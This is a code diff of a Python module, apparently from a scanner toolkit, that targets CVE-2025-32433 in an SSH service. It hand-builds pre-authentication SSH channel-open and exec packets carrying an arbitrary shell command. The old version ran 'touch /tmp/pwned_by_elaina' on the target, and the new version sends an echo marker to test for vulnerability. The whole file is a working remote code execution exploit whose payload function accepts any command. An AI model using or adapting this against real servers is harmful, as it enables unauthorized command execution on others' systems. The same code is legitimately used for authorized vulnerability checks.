@@ -1,17 +1,18 @@
 import socket
 import struct
+import os
 from module.other import Other
 
-class CVE202532433Exploit:
+class ElainaCVE202532433:
     def __init__(self, args):
+        self.args = args
         self.target = args.target
         self.port = args.port or 22
-        self.cmd = args.cmd or "touch /tmp/pwned_by_elaina"
         self.verbose = args.verbose
-        self.module_name = "CVE-2025-32433"
+        self.module_name = os.path.splitext(os.path.basename(__file__))[0]
         self.printer = Other()
 
-    def create_payload(self):
+    def create_payload(self, cmd: bytes):
         payload_channel_open = (
             b"\x5a"
             + struct.pack(">I", len(b"session")) + b"session"
@@ -19,28 +20,52 @@ class CVE202532433Exploit:
             + struct.pack(">I", 0x100000)
             + struct.pack(">I", 0x4000)
         )
+
         payload_channel_request = (
             b"\x62"
             + struct.pack(">I", 0)
             + struct.pack(">I", len(b"exec")) + b"exec"
             + struct.pack("?", False)
-            + struct.pack(">I", len(self.cmd.encode())) + self.cmd.encode()
+            + struct.pack(">I", len(cmd)) + cmd
         )
+
         return payload_channel_open + payload_channel_request
 
-    def run(self):
+    def send_payload(self, ip, port, cmd):
         try:
-            s = socket.create_connection((self.target, self.port), timeout=5)
-            banner = s.recv(1024)
+            s = socket.create_connection((ip, port), timeout=5)
+            banner = s.recv(1024).decode(errors="ignore")
             if self.verbose:
-                print(f"[+] SSH Banner: {banner.decode(errors='ignore').strip()}")
-            s.send(self.create_payload())
+                print(f"[+] SSH Banner: {banner.strip()}")
+
+            payload = self.create_payload(cmd.encode())
+            s.send(payload)
+            resp = s.recv(1024).decode(errors="ignore")
             s.close()
-            colored = self.printer.color_text(self.module_name, "cyan")
-            print(f"[+] [Module: {colored}] [Exploit Sent] [Target: {self.target}:{self.port}]")
-            return {"cve": self.module_name, "target": self.target, "success": True}
+            return resp
         except Exception as e:
-            return {"cve": self.module_name, "target": self.target, "success": False, "error": str(e)}
+            return f"ERROR: {e}"
+
+    def run(self):
+        result = {"vulnerable": False, "target": f"{self.target}:{self.port}"}
+        if self.verbose:
+            print(f"[*] [Module: {self.module_name}] [Started Scan]")
+
+        cmd = "echo elaina_vuln_check"
+        resp = self.send_payload(self.target, self.port, cmd)
+
+        if "elaina_vuln_check" in resp:
+            result["vulnerable"] = True
+            result["response"] = resp
+            colored_mod = self.printer.color_text(self.module_name, "cyan")
+            colored_target = self.printer.color_text(f"{self.target}:{self.port}", "yellow")
+            print(f"[+] [Module: {colored_mod}] [Vulnerable] [Target: {colored_target}]")
+        else:
+            colored_mod = self.printer.color_text(self.module_name, "cyan")
+            colored_target = self.printer.color_text(f"{self.target}:{self.port}", "red")
+            print(f"[-] [Module: {colored_mod}] [Not Vulnerable] [Target: {colored_target}]")
+
+        return result
 
 def scan(args=None):
-    return CVE202532433Exploit(args).run()
+    return ElainaCVE202532433(args).run()
